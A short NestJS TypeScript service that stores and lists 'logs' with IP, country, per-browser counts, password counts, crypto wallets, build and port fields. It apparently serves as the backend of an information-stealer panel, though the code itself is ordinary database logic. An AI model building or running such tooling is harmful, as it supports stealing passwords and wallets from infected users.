import { Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { Log } from './log.entity';

@Injectable()
export class LogService {
    constructor(@InjectRepository(Log) private readonly logRepository: Repository<Log>) {}

   async create(dto: {
    id: number,
    num: string,
    ip: { 
        i: string, 
        co: string, 
        countrycode: string 
    },
    browse: { 
        Edge: number, 
        Brave: number, 
        Opera: number, 
        Chrome: number, 
        Safari: number, 
        Firefox: number, 
        Vivaldi: number
    },
    passwords: number,
    wallets: string[],
    build: string,
    date: Date;
    port: string,
    }) {
        const log = this.logRepository.create(dto)
        return await this.logRepository.save(log)
    }

    findMany() {
        return this.logRepository.find()
    }
}